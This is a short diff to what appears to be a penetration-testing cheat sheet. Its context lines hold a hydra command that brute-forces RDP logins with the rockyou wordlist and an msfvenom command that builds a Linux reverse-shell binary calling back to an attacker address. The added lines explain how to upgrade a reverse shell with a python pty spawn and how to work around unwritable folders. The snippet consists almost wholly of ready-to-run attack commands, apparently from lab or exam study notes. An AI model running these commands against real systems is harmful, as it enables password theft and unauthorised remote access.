@@ -2871,3 +2871,15 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 
 # Linux reverse shell
 	msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell.exe LHOST=192.168.45.246 LPORT=445
+
+ # Common Errors And Workarounds
+
+ su: must be run from a terminal
+ 	Summary: This happens when you have a reverse shell via php or nc alone
+ 	Solution: Log into box via SSH, or spawn a /bin/bash subprocess via python
+  	Ex: python2 -c 'import pty; pty.spawn("/bin/bash")'
+
+Folder Is not writable
+	Solution: Move to /tmp
+
+ 
